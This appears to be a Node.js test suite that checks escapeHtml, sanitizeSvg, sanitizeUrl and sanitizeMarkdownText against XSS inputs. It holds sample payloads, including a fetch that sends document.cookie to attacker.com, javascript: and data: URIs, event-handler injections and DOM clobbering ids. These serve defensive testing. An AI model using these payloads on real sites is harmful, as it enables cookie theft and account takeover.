import test from "node:test";
import assert from "node:assert/strict";
import { escapeHtml, sanitizeSvg, sanitizeUrl, sanitizeMarkdownText } from "../src/lib/utils.ts";

// ============================================================================
// Dynamic Rendering Sanitization & XSS Defense Tests
// ============================================================================

test("Rendering Sanitization 1: escapeHtml properly encodes HTML special characters", () => {
  const input = `<div class="code-line" id='line-1'>let a = b & c; \`template\`</div>`;
  const escaped = escapeHtml(input);

  assert.equal(escaped.includes("<"), false);
  assert.equal(escaped.includes(">"), false);
  assert.equal(escaped.includes('"'), false);
  assert.equal(escaped.includes("'"), false);
  assert.equal(escaped.includes("`"), false);

  assert.ok(escaped.includes("&lt;div"));
  assert.ok(escaped.includes("&quot;code-line&quot;"));
  assert.ok(escaped.includes("&#39;line-1&#39;"));
  assert.ok(escaped.includes("&amp;"));
  assert.ok(escaped.includes("&#96;template&#96;"));
});

test("Rendering Sanitization 2: escapeHtml neutralizes script injection payloads", () => {
  const xssPayloads = [
    `<script>alert(document.domain)</script>`,
    `<img src=x onerror="fetch('http://attacker.com?c=' + document.cookie)">`,
    `<svg/onload=alert('XSS')>`,
    `" onfocus="alert(1)" autofocus="`,
    `<a href="javascript:alert(1)">Click Me</a>`,
  ];

  for (const payload of xssPayloads) {
    const safe = escapeHtml(payload);
    assert.equal(safe.includes("<script>"), false);
    assert.equal(safe.includes("<img"), false);
    assert.equal(safe.includes("<svg"), false);
    assert.equal(safe.includes("<a"), false);
    assert.ok(safe.startsWith("&lt;") || safe.startsWith("&quot;"));
  }
});

test("Rendering Sanitization 3: sanitizeSvg strips <script> tags and embedded executable blocks", () => {
  const dirtySvg = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
    <script>alert('pwned');</script>
    <circle cx="50" cy="50" r="40" fill="red" />
  </svg>`;

  const sanitized = sanitizeSvg(dirtySvg);

  assert.equal(sanitized.includes("<script"), false, "Must not contain script tags");
  assert.equal(sanitized.includes("alert"), false, "Must not contain script contents");
  assert.ok(sanitized.includes("<circle"), "Must preserve safe circle element");
  assert.ok(
    sanitized.includes('cx="50"') || sanitized.includes('cx="50"'),
    "Must preserve valid SVG attributes",
  );
});

test("Rendering Sanitization 4: sanitizeSvg strips <foreignObject>, <iframe>, <object>, <embed>", () => {
  const dirtySvg = `<svg viewBox="0 0 200 200">
    <foreignObject width="100" height="100">
      <body xmlns="http://www.w3.org/1999/xhtml">
        <div><iframe src="https://attacker.com"></iframe></div>
      </body>
    </foreignObject>
    <embed src="malicious.swf"></embed>
    <rect width="50" height="50" fill="blue" />
  </svg>`;

  const sanitized = sanitizeSvg(dirtySvg);

  assert.equal(sanitized.toLowerCase().includes("<foreignobject"), false);
  assert.equal(sanitized.toLowerCase().includes("<iframe"), false);
  assert.equal(sanitized.toLowerCase().includes("<embed"), false);
  assert.ok(sanitized.includes("<rect"), "Must preserve safe rect element");
});

test("Rendering Sanitization 5: sanitizeSvg strips inline on* event attributes", () => {
  const dirtySvg = `<svg viewBox="0 0 100 100">
    <path d="M10 10" onload="alert('loaded')" onclick="steal()" onerror="alert('error')" />
  </svg>`;

  const sanitized = sanitizeSvg(dirtySvg);

  assert.equal(sanitized.toLowerCase().includes("onload"), false);
  assert.equal(sanitized.toLowerCase().includes("onclick"), false);
  assert.equal(sanitized.toLowerCase().includes("onerror"), false);
  assert.ok(sanitized.includes("<path"), "Must preserve safe path element");
  assert.ok(sanitized.includes('d="M10 10"') || sanitized.includes('d="M10 10"'));
});

test("Rendering Sanitization 6: sanitizeSvg strips javascript: URI schemes in href", () => {
  const dirtySvg = `<svg viewBox="0 0 100 100">
    <a href="javascript:alert(1)"><text>Exploit</text></a>
    <a href="https://kruzz.dev"><text>Safe Link</text></a>
  </svg>`;

  const sanitized = sanitizeSvg(dirtySvg);

  assert.equal(sanitized.toLowerCase().includes("javascript:"), false);
  assert.ok(sanitized.includes("https://kruzz.dev"), "Must preserve safe https links");
});

test("Rendering Sanitization 7: sanitizeSvg handles empty, whitespace, and nullish inputs gracefully", () => {
  assert.equal(sanitizeSvg(""), "");
  assert.equal(sanitizeSvg(null), "");
  assert.equal(sanitizeSvg(undefined), "");
});

test("Rendering Sanitization 8: sanitizeSvg strips xlink:href dangerous protocols and protocol-relative URIs", () => {
  const dirtySvg = `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <a xlink:href="javascript:alert(1)"><text>Attack 1</text></a>
    <a xlink:href="//attacker.com/evil.svg"><text>Attack 2</text></a>
    <a xlink:href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="><text>Attack 3</text></a>
  </svg>`;

  const sanitized = sanitizeSvg(dirtySvg);
  assert.equal(sanitized.toLowerCase().includes("javascript:"), false);
  assert.equal(sanitized.toLowerCase().includes("//attacker.com"), false);
  assert.equal(sanitized.toLowerCase().includes("data:text/html"), false);
});

test("Rendering Sanitization 9: sanitizeSvg neutralizes DOM clobbering identifiers", () => {
  const clobberingSvg = `<svg>
    <g id="window"></g>
    <g id="document"></g>
    <g id="location"></g>
    <g id="safe-node-123"></g>
  </svg>`;

  const sanitized = sanitizeSvg(clobberingSvg);
  assert.equal(sanitized.includes('id="window"'), false);
  assert.equal(sanitized.includes('id="document"'), false);
  assert.equal(sanitized.includes('id="location"'), false);
  assert.ok(sanitized.includes('id="safe-node-123"'));
});

test("Rendering Sanitization 10: sanitizeUrl strictly validates allowed protocols and rejects dangerous schemes", () => {
  assert.equal(sanitizeUrl("https://kruzz.dev/profile"), "https://kruzz.dev/profile");
  assert.equal(sanitizeUrl("http://localhost:3000"), "http://localhost:3000");
  assert.equal(sanitizeUrl("mailto:support@kruzz.dev"), "mailto:support@kruzz.dev");

  // Rejections
  assert.equal(sanitizeUrl("javascript:alert(1)"), "");
  assert.equal(sanitizeUrl("vbscript:msgbox(1)"), "");
  assert.equal(sanitizeUrl("data:text/html,<script>alert(1)</script>"), "");
  assert.equal(sanitizeUrl("//attacker.com/phishing"), "");
  assert.equal(sanitizeUrl(""), "");
  assert.equal(sanitizeUrl(null), "");
});

test("Rendering Sanitization 11: sanitizeMarkdownText neutralizes raw embedded HTML", () => {
  const dirtyMarkdown = `# Architecture Overview
Here is a diagram:
<script>stealTokens()</script>
<iframe src="https://attacker.com"></iframe>
- Principle 1: High Availability
- Principle 2: Idempotency`;

  const clean = sanitizeMarkdownText(dirtyMarkdown);
  assert.equal(clean.includes("<script"), false);
  assert.equal(clean.includes("<iframe"), false);
  assert.ok(clean.includes("# Architecture Overview"));
  assert.ok(clean.includes("- Principle 1: High Availability"));
});
